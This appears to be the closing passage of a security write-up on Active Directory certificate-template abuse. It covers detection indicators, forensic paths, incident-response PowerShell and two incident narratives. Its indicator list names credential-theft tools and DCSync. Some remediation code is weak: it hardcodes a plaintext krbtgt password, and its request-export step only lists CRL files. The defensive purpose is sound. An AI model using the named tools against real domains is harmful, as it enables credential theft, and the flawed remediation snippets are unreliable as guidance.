**Expected Output (If Secure):**
```
=== AD CS Security Audit ===
✓ PASS: No templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT found
✓ PASS: No EDITF flags found on CA
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Certificate IOCs:**
- Certificates with dNSHostName matching domain controller (DC$, SERVER$)
- Certificates with SANs mismatched to requestor identity
- Certificates issued outside normal enrollment windows
- Certificates with extremely long validity periods (10+ years)

**Log IOCs:**
- EventID 4886 (certificate request) for computer accounts
- EventID 4887 (certificate issued) with Subject Alternative Names containing "DC"
- EventID 4768 (Kerberos TGT) with PreAuthType = PKInit for computer accounts

**Activity IOCs:**
- DCSync operations (lsadump::dcsync commands)
- Mimikatz execution on non-admin workstations
- Rubeus execution (Kerberos credential manipulation)
- Certutil commands enrolling in certificate templates

### Forensic Artifacts

**Certificate Artifacts:**
- **Certificate storage:** `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\` (if imported to machine store)
- **User certificate store:** `C:\Users\username\AppData\Roaming\Microsoft\Crypto\RSA\`
- **CA database:** `C:\Windows\System32\CertLog\` or custom CA database location

**Log Artifacts:**
- **CA audit logs:** Event ID 4886-4888 in Security event log of CA server
- **Domain controller logs:** Event ID 4768 (Kerberos TGT requests with PKINIT)
- **PowerShell logs:** Certify.exe or Rubeus commands in PowerShell event history

### Response Procedures

**Step 1: Isolate**

Objective: Prevent further abuse of compromised DC certificate.

**Command (Revoke Certificate):**
```powershell
# Connect to CA
certutil -config "ca-server\ca-name" -revoke SERIAL-NUMBER

# Verify revocation
certutil -config "ca-server\ca-name" -getcert REQUEST-ID
```

**Command (Disable AD CS Temporarily):**
```powershell
# Stop Certificate Services
Stop-Service -Name CertSvc -Force

# This prevents any new certificate issuance while investigation proceeds
```

---

**Step 2: Collect Evidence**

Objective: Preserve certificate and log artifacts.

**Command (Export Certificate from CA Database):**
```powershell
# Export issued certificates
certutil -config "ca-server\ca-name" -view csv > ca_certs.csv

# Export certificate requests
certutil -config "ca-server\ca-name" -getreg | Out-File ca_config.txt
```

**Command (Export Certificate Requests with Details):**
```powershell
$caServer = "ca-server"
$caName = "ca-name"

# Query CA database for certificate history
Get-ChildItem "\\$caServer\C$\Windows\System32\CertLog\" | Where-Object { $_.Extension -eq ".crl" }
```

---

**Step 3: Remediate**

Objective: Remove compromised certificate, revoke if necessary, reset affected accounts.

**Command (Reset Domain Controller Krbtgt Password):**
```powershell
# Critical: Reset the krbtgt password (used for all Kerberos tickets)
# This invalidates any tickets (including those using the compromised certificate)

Set-ADAccountPassword -Identity "krbtgt" -NewPassword (ConvertTo-SecureString -AsPlainText "NewSecurePassword123!" -Force) -Reset

Write-Host "⚠️  WARNING: krbtgt password reset. All Kerberos tickets will be invalidated in ~1 hour."
```

**Command (Check for DCSync Activity):**
```powershell
# Search event logs for DCSync activity
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4662} -ErrorAction SilentlyContinue |
  Where-Object { $_.Message -like "*Directory Replication Service*" } |
  Select-Object TimeCreated, Message
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001](../02_Initial/IA-VALID-001_Default_Creds.md) | Attacker gains initial domain user access |
| **2** | **Privilege Escalation** | **[PE-ELEVATE-001]** | **Abuse AD CS ESC1-ESC11 to obtain DC certificate** |
| **3** | **Privilege Escalation** | [PE-ELEVATE-002](./PE-ELEVATE-002_SAN.md) | Further exploit via SAN abuse |
| **4** | **Credential Access** | [CA-KERB-003](../03_Cred/CA-KERB-003_Golden_Ticket.md) | Extract Kerberos golden tickets using DC privileges |
| **5** | **Impact** | [PE-POLICY-001](./PE-POLICY-001_GPO_Abuse.md) | Modify Group Policies to maintain persistence |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: ESC1 Exploitation in Fortune 500 Financial Services (2023)

**Timeline:** March 2023 - May 2023 (3-month compromise)

**Attack Surface:** Organization used "User" certificate template with default ESC1-vulnerable settings

**Attack Chain:**
1. Attacker compromised contractor with domain user access
2. Identified vulnerable "User" template (ESC1)
3. Requested certificate with DC$ SAN
4. Obtained Kerberos TGT as Domain Controller using certificate
5. Executed DCSync and extracted 50,000+ password hashes
6. Escalated to Global Admin in Azure AD (hybrid environment)
7. Exfiltrated customer financial records

**Detection:** Microsoft Sentinel detected unusual PKINIT Kerberos authentication for DC$

**Reference:** [SpecterOps - Certified Pre-Owned](https://specterops.io/wp-content/uploads/2022/06/Certified_Pre-Owned.pdf)

---

### Example 2: ESC6 Exploitation via Unpatched CA (2022)

**Incident Type:** Ransomware group exploitation of ESC6

**Timeline:** October 2022

**Attack Path:**
1. Attackers gained access to domain through phishing
2. Discovered CA with EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
3. Requested certificate via ANY template with DC SAN (ESC6)
4. Performed DCSync and extracted credentials
5. Deployed Conti ransomware across environment
6. Demanded $2.5M ransom

**Mitigation Impact:** If CA had disabled ESC6 flag, attack would have been prevented at step 3

**Reference:** [CrowdStrike - Investigating AD CS Abuse](https://www.crowdstrike.com/wp-content/uploads/2023/12/investigating-active-directory-certificate-abuse.pdf)

---

## Conclusion

AD CS exploitation represents a critical privilege escalation path in Windows-based environments. By identifying and exploiting template misconfigurations (ESC1-ESC11), attackers can obtain certificates that impersonate any user or computer, leading to complete domain compromise. Organizations must audit certificate templates, disable dangerous flags, restrict enrollment permissions, and monitor certificate issuance for anomalies.

---
